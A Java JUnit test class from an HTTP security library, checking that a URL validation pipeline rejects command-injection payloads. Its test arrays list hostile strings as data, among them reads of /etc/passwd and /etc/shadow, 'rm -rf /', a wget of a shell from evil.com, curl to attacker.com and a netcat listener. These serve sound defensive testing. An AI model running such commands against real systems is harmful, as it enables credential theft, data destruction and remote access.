/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.tests;

import de.cuioss.test.generator.junit.EnableGeneratorController;
import de.cuioss.test.generator.junit.parameterized.TypeGeneratorSource;
import de.cuioss.tools.security.http.config.SecurityConfiguration;
import de.cuioss.tools.security.http.core.UrlSecurityFailureType;
import de.cuioss.tools.security.http.exceptions.UrlSecurityException;
import de.cuioss.tools.security.http.generators.CommandInjectionAttackGenerator;
import de.cuioss.tools.security.http.monitoring.SecurityEventCounter;
import de.cuioss.tools.security.http.pipeline.URLPathValidationPipeline;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;

import static org.junit.jupiter.api.Assertions.*;

/**
 * T13: Test command injection patterns
 * 
 * <p>
 * This test class implements Task T13 from the HTTP security validation plan,
 * focusing on testing command injection attacks that attempt to execute operating
 * system commands through web application inputs. Command injection represents one
 * of the most critical security vulnerabilities, potentially leading to complete
 * system compromise and unauthorized access to server resources.
 * </p>
 * 
 * <h3>Test Coverage</h3>
 * <ul>
 *   <li>Shell Command Chaining - Unix/Linux operators (;, &&, ||, |)</li>
 *   <li>Windows Command Injection - CMD and PowerShell syntax variations</li>
 *   <li>Piped Command Injection - Command piping and output redirection</li>
 *   <li>Redirection Attacks - File system output manipulation</li>
 *   <li>Environment Variable Injection - Shell variable exploitation</li>
 *   <li>Subshell Command Injection - Command substitution techniques</li>
 *   <li>Path Traversal Command Injection - Combined attack vectors</li>
 *   <li>Sleep-based Command Injection - Time-delay detection methods</li>
 *   <li>Error-based Command Detection - System error exploitation</li>
 *   <li>Network-based Command Injection - External communication attacks</li>
 *   <li>File System Command Attacks - File manipulation operations</li>
 *   <li>Process Control Attacks - System process manipulation</li>
 *   <li>Privilege Escalation Commands - Unauthorized access attempts</li>
 *   <li>Data Exfiltration Commands - Information extraction techniques</li>
 *   <li>Multi-platform Command Variants - Cross-platform compatibility</li>
 * </ul>
 * 
 * <h3>Security Standards Compliance</h3>
 * <p>
 * This test ensures compliance with:
 * </p>
 * <ul>
 *   <li>OWASP Top 10: A03:2021 – Injection</li>
 *   <li>CWE-78: Improper Neutralization of Special Elements used in an OS Command</li>
 *   <li>CWE-77: Improper Neutralization of Special Elements used in a Command</li>
 *   <li>NIST SP 800-53: SI-10 Information Input Validation</li>
 *   <li>ISO 27001: A.14.2.1 Secure development policy</li>
 * </ul>
 * 
 * <h3>Performance Requirements</h3>
 * <p>
 * Each validation must complete within 8ms to ensure production feasibility.
 * Command injection detection should not introduce significant latency to
 * web application response times.
 * </p>
 * 
 * @see CommandInjectionAttackGenerator
 * @see URLPathValidationPipeline
 * @author Generated for HTTP Security Validation (T13)
 * @version 1.0.0
 */
@EnableGeneratorController
@DisplayName("T13: Command Injection Attack Validation Tests")
class CommandInjectionAttackTest {

    private URLPathValidationPipeline pipeline;
    private SecurityEventCounter eventCounter;
    private SecurityConfiguration config;

    @BeforeEach
    void setUp() {
        config = SecurityConfiguration.defaults();
        eventCounter = new SecurityEventCounter();
        pipeline = new URLPathValidationPipeline(config, eventCounter);
    }

    @ParameterizedTest
    @TypeGeneratorSource(value = CommandInjectionAttackGenerator.class, count = 150)
    @DisplayName("All command injection attacks should be rejected")
    void shouldRejectAllCommandInjectionAttacks(String commandAttackPattern) {
        var exception = assertThrows(UrlSecurityException.class,
                () -> pipeline.validate(commandAttackPattern),
                "Command injection attack should be rejected: " + sanitizeForDisplay(commandAttackPattern));

        assertTrue(
                exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
                        exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
                        exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                "Command injection should be detected with appropriate failure type, got: " + exception.getFailureType()
        );

        assertTrue(eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER) > 0,
                "Security event counter should track command injection detection");
    }

    @ParameterizedTest
    @TypeGeneratorSource(value = CommandInjectionAttackGenerator.class, count = 25)
    @DisplayName("Command injection validation should maintain performance requirements")
    void shouldMaintainPerformanceWithCommandInjection(String commandPattern) {
        long startTime = System.nanoTime();

        assertThrows(UrlSecurityException.class,
                () -> pipeline.validate(commandPattern));

        long duration = System.nanoTime() - startTime;
        long milliseconds = duration / 1_000_000;

        assertTrue(milliseconds < 8,
                "Command injection validation took %dms, should be < 8ms for pattern: %s".formatted(
                        milliseconds, sanitizeForDisplay(commandPattern)));
    }

    @Test
    @DisplayName("Known dangerous command injection patterns should be rejected")
    void shouldRejectKnownCommandInjectionAttacks() {
        String[] knownAttacks = {
                "http://example.com?cmd=ls; cat /etc/passwd",
                "https://site.org?file=data.txt && whoami",
                "http://app.com?input=test | ps aux",
                "https://api.com?param=value; rm -rf /",
                "http://test.com?data=$(whoami)",
                "https://secure.com?file=`cat /etc/shadow`",
                "http://domain.com?cmd=test; sleep 5",
                "https://web.org?input=data || net user",
                "http://site.com?param=val & ipconfig",
                "https://app.org?file=test.txt > /tmp/pwned",
                "http://example.org?cmd=ls -la /root/",
                "https://test.com?input=; wget http://evil.com/shell",
                "http://app.com?data=test && curl attacker.com",
                "https://site.org?param=val | nc -l 4444",
                "http://domain.com?file=data; kill -9 $$"
        };

        for (String attack : knownAttacks) {
            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Known command injection attack should be rejected: " + sanitizeForDisplay(attack));

            assertTrue(
                    exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
                            exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
                            exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                    "Command injection should be properly categorized for: " + sanitizeForDisplay(attack)
            );
        }
    }

    @Test
    @DisplayName("Command injection detection should handle edge cases")
    void shouldHandleEdgeCasesInCommandInjection() {
        String[] edgeCases = {
                "http://example.com?cmd=test%3Bwhoami",  // URL encoded semicolon
                "https://site.org?param=val%26%26ls",    // URL encoded &&
                "http://app.com?data=test%7C%7Cid",      // URL encoded ||
                "https://secure.com?input=test%0Als",    // URL encoded newline
                "http://domain.com?file=val%0D%0Aps",    // URL encoded CRLF
                "https://test.org?cmd=test%60whoami%60", // URL encoded backticks
                "http://site.com?param=test%24%28id%29", // URL encoded $()
                "https://app.org?data=test%3E/tmp/out",  // URL encoded redirection
                "http://web.com?input=test%20%26%20ps",  // URL encoded space and &
                "https://domain.org?file=test%7Ccat"     // URL encoded pipe
        };

        for (String edgeCase : edgeCases) {
            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(edgeCase),
                    "Edge case command injection should be detected: " + sanitizeForDisplay(edgeCase));

            assertNotNull(exception.getFailureType(),
                    "Edge case should have proper failure type classification");
        }
    }

    @Test
    @DisplayName("Should validate legitimate system commands are properly blocked")
    void shouldValidateLegitimateCommandBlocking() {
        String[] legitimateButDangerous = {
                "http://example.com?backup=data; tar czf backup.tar.gz /data",
                "https://site.org?user=admin && id admin",
                "http://app.com?process=monitor | ps -ef | grep java",
                "https://secure.com?system=info || uname -a",
                "http://domain.com?network=test; netstat -an",
                "https://test.org?file=log.txt > /var/log/app.log",
                "http://site.com?service=status && systemctl status nginx",
                "https://app.org?disk=usage; df -h",
                "http://web.com?memory=info | free -m",
                "https://domain.org?env=vars && printenv"
        };

        for (String command : legitimateButDangerous) {
            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(command),
                    "Legitimate but dangerous command should be blocked: " + sanitizeForDisplay(command));

            assertTrue(
                    exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
                            exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
                            exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                    "Command should be properly classified as dangerous"
            );
        }
    }

    @Test
    @DisplayName("Should handle multi-platform command injection variants")
    void shouldHandleMultiPlatformCommands() {
        String[] multiPlatformAttacks = {
                "http://example.com?os=info; uname -a || systeminfo",
                "https://site.org?shell=check && which bash || where cmd",
                "http://app.com?version=os | cat /etc/issue || ver",
                "https://secure.com?proc=list; ps -ef || tasklist",
                "http://domain.com?net=route && netstat -rn || route print",
                "https://test.org?tasks=cron | crontab -l || schtasks",
                "http://site.com?users=list; cat /etc/passwd || net user",
                "https://app.org?services=status && service --status-all || sc query"
        };

        for (String attack : multiPlatformAttacks) {
            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Multi-platform command injection should be detected: " + sanitizeForDisplay(attack));

            assertNotNull(exception.getFailureType(),
                    "Multi-platform attack should be properly classified");
        }
    }

    @Test
    @DisplayName("Should properly track command injection security events")
    void shouldTrackCommandInjectionEvents() {
        long initialCount = eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);

        String testAttack = "http://example.com?test=value; whoami";

        assertThrows(UrlSecurityException.class,
                () -> pipeline.validate(testAttack));

        long finalCount = eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);

        assertTrue(finalCount > initialCount,
                "Command injection detection should increment security event counter");
    }

    @Test
    @DisplayName("Should maintain consistent detection across similar patterns")
    void shouldConsistentlyDetectSimilarPatterns() {
        String[] similarPatterns = {
                "http://example.com?cmd=test; ls",
                "http://example.com?cmd=test && ls",
                "http://example.com?cmd=test || ls",
                "http://example.com?cmd=test | ls",
                "http://example.com?cmd=test & ls"
        };

        int detectionCount = 0;
        for (String pattern : similarPatterns) {
            try {
                pipeline.validate(pattern);
            } catch (UrlSecurityException e) {
                detectionCount++;
                assertTrue(
                        e.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
                                e.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
                                e.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                        "Similar pattern should have consistent detection: " + pattern
                );
            }
        }

        assertEquals(similarPatterns.length, detectionCount,
                "All similar command injection patterns should be consistently detected");
    }

    private String sanitizeForDisplay(String input) {
        if (input == null) return "null";
        return input.length() > 100 ?
                input.substring(0, 100) + "..." : input;
    }
}